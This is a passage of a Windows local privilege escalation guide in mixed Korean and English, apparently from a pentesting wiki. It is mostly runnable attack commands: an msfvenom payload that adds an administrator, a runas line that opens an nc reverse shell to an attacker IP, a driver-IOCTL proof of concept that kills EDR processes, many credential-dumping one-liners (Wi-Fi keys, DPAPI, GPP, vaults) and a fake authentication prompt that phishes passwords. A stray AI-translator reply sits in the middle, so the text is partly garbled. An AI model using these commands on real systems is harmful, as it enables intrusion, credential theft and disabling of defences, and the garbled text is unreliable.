**탐지하고 악용할 수 있습니다** 이 취약점을 metasploit 모듈로: `exploit/windows/local/trusted\_service\_path`  
metasploit로 수동으로 서비스 바이너리를 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows는 서비스가 실패할 경우 수행할 동작을 사용자가 지정할 수 있습니다. 이 기능은 특정 binary를 가리키도록 구성할 수 있으며, 해당 binary를 교체할 수 있다면 privilege escalation이 가능할 수 있습니다. 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)을 참조하세요.

## Applications

### Installed Applications

**permissions of the binaries**와 **폴더**를 확인하세요 (maybe you can overwrite one and escalate privileges) ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 config file을 수정해 특별한 파일을 읽을 수 있는지, 또는 Administrator 계정에 의해 실행될 binary를 수정할 수 있는지(schedtasks)를 확인하세요.

시스템에서 취약한 폴더/파일 권한을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 시작 시 실행

**다른 사용자가 실행할 레지스트리나 바이너리를 덮어쓸 수 있는지 확인하세요.**\
**읽어보세요** **다음 페이지**에서 흥미로운 **autoruns locations to escalate privileges**에 대해 더 알아보세요:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **서드파티의 이상하거나 취약한** 드라이버를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

일부 서명된 서드파티 드라이버는 IoCreateDeviceSecure를 통해 강력한 SDDL로 device object를 생성하지만 DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하는 것을 잊습니다. 이 플래그가 없으면, 추가 컴포넌트를 포함한 경로로 디바이스를 열 때 secure DACL이 적용되지 않아, 비권한 사용자도 다음과 같은 네임스페이스 경로를 사용해 핸들을 얻을 수 있습니다:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

사용자가 디바이스를 열 수 있게 되면, 드라이버가 노출한 privileged IOCTLs를 LPE 및 변조에 악용할 수 있습니다. 실제로 관찰된 예시 기능들:
- 임의 프로세스에 대한 전체 접근 핸들 반환 (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- 제한 없는 raw disk read/write (오프라인 변조, 부팅 시 영속성 트릭).
- Protected Process/Light (PP/PPL)를 포함한 임의 프로세스 종료, 이를 통해 user land에서 kernel을 통해 AV/EDR를 종료(kill)할 수 있음.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화책
- DACL로 제한하려는 device 객체를 생성할 때 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한 있는 작업에 대해 호출자 컨텍스트를 검증하세요. 프로세스 종료나 handle 반환을 허용하기 전에 PP/PPL 검사를 추가하세요.
- IOCTLs( access masks, METHOD_*, input validation)를 제한하고 직접 kernel 권한 대신 brokered models를 고려하세요.

수비자를 위한 탐지 아이디어
- 의심스러운 디바이스 이름(예: \\ .\\amsdk*)의 user-mode 오픈과 남용을 시사하는 특정 IOCTL 시퀀스를 모니터링하세요.
- Microsoft의 vulnerable driver blocklist(HVCI/WDAC/Smart App Control)를 적용하고 자체 allow/deny 목록을 유지하세요.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보는 다음을 참조하세요:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 및 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 열려 있는 포트

외부에서 접근 가능한 **제한된 서비스**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall 규칙

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 비활성화, 비활성화...)**

추가[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
바이너리 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에도 있습니다.

root user를 얻으면 어떤 포트에서도 listen할 수 있습니다(처음 `nc.exe`로 포트를 listen하면 GUI를 통해 `nc`를 firewall에서 허용할지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
To easily start bash as root, you can try `--default-user root`

다음 폴더에서 `WSL` 파일시스템을 탐색할 수 있습니다: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 credentials를 저장합니다. 이러한 credentials는 **Windows**가 사용자를 자동으로 로그인시킬 수 있게 해 줍니다. 처음 보면 사용자가 Facebook, Twitter, Gmail 등과 같은 자격증명을 저장해 브라우저에서 자동으로 로그인하도록 하는 기능처럼 보일 수 있지만, 실제로는 그렇지 않습니다.

Windows Vault는 **Windows**가 사용자를 자동으로 로그인시킬 수 있는 자격증명을 저장합니다. 즉, 어떤 **Windows application that needs credentials to access a resource**(서버 또는 웹사이트)라도 **can make use of this Credential Manager** & Windows Vault를 이용해 사용자가 매번 사용자명과 비밀번호를 입력하는 대신 저장된 자격증명을 사용할 수 있다는 뜻입니다.

애플리케이션이 Credential Manager와 상호작용하지 않으면 특정 리소스에 대한 자격증명을 사용할 수 없을 것입니다. 따라서 애플리케이션이 vault를 사용하려면 기본 저장 vault에서 해당 리소스의 자격증명을 요청하기 위해 어떻게든 **communicate with the credential manager and request the credentials for that resource** 해야 합니다.

머신에 저장된 자격증명을 나열하려면 `cmdkey`를 사용하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`를 `/savecred` 옵션과 함께 사용할 수 있습니다. 다음 예제는 SMB 공유를 통해 원격 binary를 호출하는 예입니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`를 제공된 자격 증명 세트로 사용하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)에서 얻을 수 있다는 점에 유의하세요.

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
적절한 인수 (`/pvk` 또는 `/rpc`)와 함께 **mimikatz module** `dpapi::masterkey`를 사용하여 이를 복호화할 수 있습니다.

**credentials files protected by the master password**는 일반적으로 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
루트 권한이 있으면 `sekurlsa::dpapi` 모듈로 **많은 DPAPI** **masterkeys**를 **memory**에서 추출할 수 있습니다.

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 암호화된 credentials를 편리하게 저장하기 위한 **scripting** 및 자동화 작업에 자주 사용됩니다. 해당 credentials는 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 사용자와 동일한 컴퓨터에서만 복호화할 수 있습니다.

파일에 들어있는 PS credentials를 **decrypt**하려면 다음을 실행하면 됩니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 와이파이
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

다음 경로에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files`\
Mimikatz `sekurlsa::dpapi` 모듈로 메모리에서 많은 DPAPI masterkeys를 추출할 수 있습니다.

### Sticky Notes

사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용해 데이터베이스 파일이라는 사실을 모른 채 **비밀번호** 및 기타 정보를 **저장**합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 찾아보고 조사할 가치가 있습니다.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
이 파일이 존재하면 일부 **credentials**가 구성되어 있고 **복구**될 수 있습니다.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요 .\  
설치 프로그램은 **SYSTEM 권한으로 실행됩니다**, 많은 프로그램이 **DLL Sideloading (정보 출처** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH keys

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 그 안에 흥미로운 항목이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로에서 항목을 찾으면 대부분 저장된 SSH 키일 가능성이 높습니다. 이 키는 암호화되어 저장되어 있지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 기술에 대한 자세한 정보: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

만약 `ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기법은 더 이상 유효하지 않은 것 같습니다. 몇 개의 ssh 키를 생성하고 `ssh-add`로 추가한 뒤 ssh로 머신에 로그인해보았습니다.
> 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않았고 procmon은 비대칭 키 인증 과정에서 `dpapi.dll`의 사용을 식별하지 못했습니다.

### 감시되지 않은 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
다음 파일들은 **metasploit**을 사용하여 검색할 수도 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

파일 이름이 **SiteList.xml**인 파일을 찾으세요.

### Cached GPP Password

이전에는 Group Policy Preferences (GPP)를 통해 여러 컴퓨터에 커스텀 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 그러나 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, Group Policy Objects (GPOs)는 SYSVOL에 XML 파일로 저장되며 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 이러한 GPP 내부의 비밀번호는 공개 문서화된 기본 키로 AES256으로 암호화되어 있었고, 인증된 아무 사용자나 이를 복호화할 수 있었습니다. 이는 사용자가 권한 상승을 얻을 수 있는 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, "cpassword" 필드가 비어 있지 않은 로컬에 캐시된 GPP 파일을 검색하는 함수가 개발되었습니다. 해당 파일을 찾으면 함수는 비밀번호를 복호화하고 사용자 정의 PowerShell 객체를 반환합니다. 이 객체에는 GPP 및 파일 위치에 대한 정보가 포함되어 있어 해당 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 passwords를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config의 예:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials 요청하기

당신은 그가 알고 있을 것이라고 생각되면 언제든지 **사용자에게 자신의 credentials 또는 다른 사용자의 credentials를 입력하도록 요청할 수 있다** (참고로, 클라이언트에게 직접 **요청**하여 **credentials**를 받는 것은 정말 **위험하다**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials를 포함할 가능성이 있는 파일명**

과거에 **passwords**를 **clear-text** 또는 **Base64**로 포함하고 있었던 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your files. Please either:

- Paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md here, or
- Provide a public repo URL and the exact path so I can fetch it.

Then I will translate the English text to Korean while preserving all markdown, tags, links, paths, and code as you requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 휴지통의 자격 증명

또한 휴지통을 확인하여 그 안에 자격 증명이 있는지 살펴봐야 합니다

여러 프로그램에 저장된 **비밀번호를 복구**하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 레지스트리 내부

**자격 증명을 포함할 수 있는 다른 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

